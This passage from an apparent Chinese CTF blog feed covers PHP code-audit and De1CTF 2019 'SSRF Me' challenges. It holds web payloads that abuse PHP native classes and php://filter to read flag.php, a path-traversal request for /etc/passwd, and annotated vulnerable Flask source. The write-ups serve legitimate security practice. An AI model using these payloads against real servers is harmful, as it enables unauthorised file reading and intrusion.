id="代码审计1"><a href="#代码审计1" class="headerlink" title="代码审计1:"></a>代码审计1:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;|flag|&quot;</span>, <span class="hljs-variable">$xsx</span>)) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;flag is no here!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$xsx</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xsx&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$sys</span>(<span class="hljs-variable">$xsx</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=FilesystemIterator&amp;xsx=./<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923164401248.png" alt="image-20230923164401248"></p><p>使用php原生类返回flag.php的内容:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923172559963.png" alt="image-20230923172559963"></p><p><img src="/images/2023-9-24-Polar/image-20230923172610960.png" alt="image-20230923172610960"></p><h4 id="自由的文件上传系统："><a href="#自由的文件上传系统：" class="headerlink" title="自由的文件上传系统："></a>自由的文件上传系统：</h4><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=upload/../sectet_include.php<br>/var/www/html/upload/4382754064<br></code></pre></td></tr></table></figure><p>使用dirsearch：<br><img src="/images/2023-9-24-Polar/image-20230923155441868.png" alt="image-20230923155441868"></p><p><img src="/images/2023-9-24-Polar/image-20230923155509582.png" alt="image-20230923155509582"></p><p><img src="/images/2023-9-24-Polar/image-20230923155519918.png" alt="image-20230923155519918"></p><p>发现有.git泄露，但是.git泄露我没发现有用信息</p><p>.DS_Store:泄露也没有有用文件</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=../../../etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923180939030.png" alt="image-20230923180939030"></p><p>存在文件目录穿越，不过到最后也没有穿越出来。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[De1CTF 2019]SSRF Me 题解</title>
    <link href="/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/"/>
    <url>/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/</url>
    
    <content type="html"><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>1.查看提示:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102629610.png" alt="image-20230829102629610"></p><p>2.打开网页:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102651916.png" alt="image-20230829102651916"></p><p>观察代码，感觉是flask注入,整理代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br><br><br>            <span class="hljs-keyword">else</span>:<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>3.代码审计:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-comment"># 有参初始化一个Task对象</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        <span class="hljs-comment"># 将客户端的ip地址进行md5加密</span><br>        self.sandbox = md5(ip)<br>        <span class="hljs-comment"># 判断该ip地址是否存在</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            <span class="hljs-comment"># 如果该ip地址不存在，则为该ip地址创建一个目录，使该ip地址能够访问该网站文件</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 申请一个result字典</span><br>        result = &#123;&#125;<br>        <span class="hljs-comment"># &#123;&#x27;code&#x27;: 500&#125;</span><br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-comment"># md5(secert_key + param + action)=sign</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                <span class="hljs-comment"># 打开result.txt文件，并用tmpfile指代该文件</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                <span class="hljs-comment"># 获取param路径下的文件内容，并存储到resp中</span><br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 读取到param文件下的内容时，将该文件内容打印，但是该打印的内容无法呈现到网页中，只能呈现在编译器中</span><br>                    <span class="hljs-comment"># 所以无法利用其查看resp的内容</span><br>                    <span class="hljs-built_in">print</span>(resp)<br>                    <span class="hljs-comment"># 将读取的文件内容写入tmofile中</span><br>                    tmpfile.write(resp)<br>                    <span class="hljs-comment"># 关闭文件tmpfile</span><br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    <span class="hljs-comment"># 再次读取result.txt文件</span><br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    <span class="hljs-comment"># 将读取的文件内容存储到result字典中</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 如果action中没有scan则返回错误</span><br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 对该对象的action和param进行md5加密，判断加密结果和该对象的sign是否相等</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><span class="hljs-comment"># 访问url/geneSig时，该网页支持get和post请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    <span class="hljs-comment"># request.args.get()获取参数param的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># 设置参数action的值为scan</span><br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-comment"># 执行getSign()函数</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><span class="hljs-comment"># 访问url/De1ta时，该网页支持GET和POST请求</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    <span class="hljs-comment"># 从cookie中获取参数action的值</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    <span class="hljs-comment"># 从get方法中获取参数param的值</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-comment"># 从cookie中获取sign的值</span><br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    <span class="hljs-comment"># ip存储客户端的ip地址</span><br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-comment"># 查看输入的param中是否存在非法字符</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    <span class="hljs-comment"># 有参数申请一个Task类，用task存储该对象</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-comment"># 返回一个json文件流到网页上，即显示task.Exec()文件内容</span><br>    <span class="hljs-comment"># 即显示result存储的内容</span><br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><span class="hljs-comment"># 访问url/的网址时，执行index()函数</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># 打开并读取code.txt文件</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 读取param路径下的文件内容</span><br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-comment"># 返回secert_key + param + action的md5结果</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-comment"># 对content内容进行md5加密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><span class="hljs-comment"># 对输入的参数进行过滤</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    <span class="hljs-comment"># 去除param首位空格，并将该字符串全部字符小写化</span><br>    check = param.strip().lower()<br>    <span class="hljs-comment"># 检测字符串是否以gopher和file开头</span><br>    <span class="hljs-comment"># 即过滤了gopher和file两个协议</span><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># main函数描述了该代码通过访问的路由来控制显示的网页内容</span><br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><h3 id="知识点介绍"><a href="#知识点介绍" class="headerlink" title="知识点介绍:"></a><strong>知识点介绍:</strong></h3><p>参考：<a href="https://geek-docs.com/flask/flask-questions/268_flask_flask_requestargsget_get_all_params_python.html">Flask Flask request.args.get 获取所有参数（Python）|极客教程 (geek-docs.com)</a></p><p><strong>urllib.unquote(string):将url编码的字符串进行解码</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">import urllib.parse<br><br>str = &#x27;%E6%B3%95%E5%9B%BD%E7%BA%A2%E9%85%92&#x27;<br><br>print(urllib.parse.unquote(str))<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">法国红酒<br></code></pre></td></tr></table></figure><h5 id="使用request-args-get获取指定参数的值"><a href="#使用request-args-get获取指定参数的值" class="headerlink" title="使用request.args.get获取指定参数的值"></a>使用request.args.get获取指定参数的值</h5><p>例子:假设我们有一个URL为<code>/user?name=John&amp;age=25</code>，我们想要获取到对应参数的值</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">from flask import Flask, request<br><br>app = Flask(__name__)<br><br>@app.route(&#x27;/user&#x27;, methods=[&#x27;GET&#x27;])<br>def get_user():<br>    name = request.args.get(&#x27;name&#x27;)<br>    age = request.args.get(&#x27;age&#x27;)<br><br>    return f&quot;Name: &#123;name&#125;, Age: &#123;age&#125;&quot;<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run()<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">在上面的代码中，我们定义了一个路由/user，并指定该路由只支持GET方法。<br>在get_user函数中，我们使用request.args.get方法获取了URL参数中名为name和age的值，并将其拼接成字符串返回。当我们访问/user?name=John&amp;age=25时，页面会显示Name: John, Age: 25<br></code></pre></td></tr></table></figure><h5 id="使用request-args-get获取所有参数的值"><a href="#使用request-args-get获取所有参数的值" class="headerlink" 